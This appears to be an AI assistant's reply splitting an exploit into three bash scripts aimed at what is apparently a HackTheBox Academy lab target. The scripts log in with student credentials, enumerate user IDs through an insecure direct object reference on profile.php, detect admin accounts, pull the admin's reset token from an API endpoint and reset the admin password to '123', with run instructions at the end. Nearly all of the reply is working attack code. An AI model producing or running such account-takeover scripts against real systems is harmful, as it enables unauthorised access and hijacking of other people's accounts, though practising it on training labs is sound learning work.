I'll split the comprehensive script into three separate scripts that work together:

1. install_deps.sh - Installs dependencies
bash
#!/bin/bash
echo "[*] Checking and installing dependencies..."

# Check and install jq if needed
if ! command -v jq &> /dev/null; then
    echo "[*] Installing jq..."
    if [[ -f /etc/debian_version ]]; then
        sudo apt update && sudo apt install -y jq
    elif [[ -f /etc/redhat-release ]]; then
        sudo yum install -y jq
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        brew install jq
    else
        echo "[-] Please install jq manually and try again"
        exit 1
    fi
    echo "[+] jq installed successfully"
else
    echo "[+] jq is already installed"
fi

echo "[+] All dependencies are ready"
2. find_users.sh - Authenticates and enumerates all users
bash
#!/bin/bash
source config.sh

echo "[*] Authenticating and enumerating users..."

# Cookie management
COOKIE_FILE=$(mktemp)
trap 'rm -f "$COOKIE_FILE"' EXIT

# Authenticate
curl -s -v -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Referer: $TARGET/" \
  -d "$CREDS" \
  -c "$COOKIE_FILE" -b "$COOKIE_FILE" > /dev/null 2>&1

if [ ! -s "$COOKIE_FILE" ] || ! grep -q "PHPSESSID" "$COOKIE_FILE"; then
  echo "[-] Authentication failed!"
  exit 1
fi
echo "[+] Authenticated successfully"

# Enumerate users
declare -A USERS
echo -e "\n[*] User enumeration results:"
for id in {1..100}; do
    response=$(curl -s -b "$COOKIE_FILE" "$TARGET/profile.php?uid=$id")
    username=$(echo "$response" | grep -oP "username: \K.*")
    
    if [[ -n "$username" ]]; then
        USERS["$id"]="$username"
        echo "UID $id: $username"
        
        # Check for admin indicators
        if [[ "$response" =~ [aA][dD][mM][iI][nN] ]] || 
           [[ "$response" =~ "role:admin" ]] || 
           [[ "$response" =~ "privilege:1" ]]; then
            echo "$id" > admin_uid.tmp
            echo "    ^--- ADMIN PRIVILEGES DETECTED!"
        fi
    fi
done

# Save users to file
for id in "${!USERS[@]}"; do
    echo "$id:${USERS[$id]}" >> users.list
done

echo -e "\n[+] User enumeration complete. Results saved to users.list"
3. admin_reset.sh - Performs admin password reset
bash
#!/bin/bash
source config.sh

if [ ! -f admin_uid.tmp ]; then
    echo "[-] No admin UID found. Run find_users.sh first."
    exit 1
fi

ADMIN_UID=$(cat admin_uid.tmp)
COOKIE_FILE=$(mktemp)

# Re-authenticate
curl -s -v -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Referer: $TARGET/" \
  -d "$CREDS" \
  -c "$COOKIE_FILE" -b "$COOKIE_FILE" > /dev/null 2>&1

echo "[*] Targeting UID $ADMIN_UID for password reset..."
ADMIN_TOKEN=$(curl -s -b "$COOKIE_FILE" "$TARGET/api.php/token/$ADMIN_UID" | jq -r '.token')

if [[ -z "$ADMIN_TOKEN" ]]; then
    echo "[-] Failed to get admin token"
    exit 1
fi
echo "[+] Admin Token: $ADMIN_TOKEN"

echo "[*] Attempting password reset..."
reset_response=$(curl -s -v -b "$COOKIE_FILE" \
  "$TARGET/reset.php?uid=$ADMIN_UID&token=$ADMIN_TOKEN&password=123" 2>&1)

if echo "$reset_response" | grep -qi "success"; then
    echo -e "\n[+] PASSWORD RESET SUCCESSFUL!"
    echo "    Admin UID: $ADMIN_UID"
    echo "    New password: 123"
else
    echo -e "\n[-] Password reset may have failed. Server response:"
    echo "$reset_response" | head -n 20
fi

rm -f "$COOKIE_FILE" admin_uid.tmp
config.sh - Shared configuration
bash
#!/bin/bash
# Target configuration
TARGET="http://94.237.55.43:50149"
LOGIN_URL="$TARGET/index.php"
CREDS="username=htb-student&password=Academy_student%21"
How to use:
First install dependencies:

bash
chmod +x install_deps.sh
./install_deps.sh
Then enumerate users:

bash
chmod +x find_users.sh
./find_users.sh
Finally perform admin password reset:

bash
chmod +x admin_reset.sh
./admin_reset.sh
Each script has a specific purpose:

install_deps.sh - One-time setup

find_users.sh - Discovers all users and identifies admins

admin_reset.sh - Performs the password reset on the admin account

The scripts share configuration through config.sh and pass data between them using temporary files (admin_uid.tmp and users.list).

